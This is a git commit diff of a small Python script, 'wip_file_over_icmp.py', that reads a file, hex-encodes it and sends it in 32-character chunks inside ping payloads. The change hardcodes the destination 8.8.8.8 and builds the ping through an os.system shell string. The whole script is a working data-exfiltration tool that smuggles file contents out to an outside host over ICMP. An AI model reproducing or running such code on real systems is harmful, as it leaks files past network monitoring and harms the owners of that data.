2c7f7e02fdd496167b4cb5092c49e3a45b54163d
Corvo <rodrigo-f-p@hotmail.com>
2023-05-23 19:46:29 -0300

    Update and rename file_over_icmp.py to wip_file_over_icmp.py

--- Code/Python/wip_file_over_icmp.py
+++ Code/Python/wip_file_over_icmp.py
@@ -1,9 +1,10 @@
-import subprocess, sys
+import subprocess, sys, os
 
-def send_icmp_packet(data, address):
+def send_icmp_packet(data):
     # Craft and send an ICMP packet using a system command
-    command = "ping -p {1} {2}".format(data, address)
-    subprocess.call(command, shell=True)
+    command = "ping -p {} 8.8.8.8".format(data)
+    os.system(command)
+    #subprocess.call(command, shell=True)
 
 def encode_file(filename):
     # Read the file as binary data
@@ -14,12 +15,12 @@ def encode_file(filename):
     hex_data = file_data.hex()
 
     # Break the hexadecimal data into chunks (adjust the chunk size as needed)
-    chunk_size = 128  # This is the number of characteres in the chunk
+    chunk_size = 32 # size in characteres
     chunks = [hex_data[i:i + chunk_size] for i in range(0, len(hex_data), chunk_size)]
 
     # Send each chunk as an ICMP packet
     for chunk in chunks:
-        send_icmp_packet(chunk, sys.argv[2])
+        send_icmp_packet(chunk) #sys.argv[2])
 
-# Send file over ICMP:
+# Usage: encode_file("filename")
 encode_file(sys.argv[1])
